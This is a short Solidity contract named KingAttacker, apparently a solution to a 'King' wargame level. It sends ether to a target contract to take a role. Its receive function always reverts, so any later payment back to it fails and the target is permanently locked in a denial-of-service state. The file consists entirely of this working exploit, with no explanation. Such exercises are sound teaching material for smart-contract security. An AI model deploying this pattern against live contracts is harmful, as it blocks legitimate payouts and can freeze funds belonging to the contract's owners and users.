pragma solidity ^0.8.0;


contract KingAttacker {
    address public target;

    constructor(address _target) payable {
      target = _target;
    }

    function attack() public {
        (bool success, ) = target.call{value: 0.001 ether}("");
        require(success, "Call failed");
    }

    receive() external payable {
      revert("I'm a fallback");
    }
}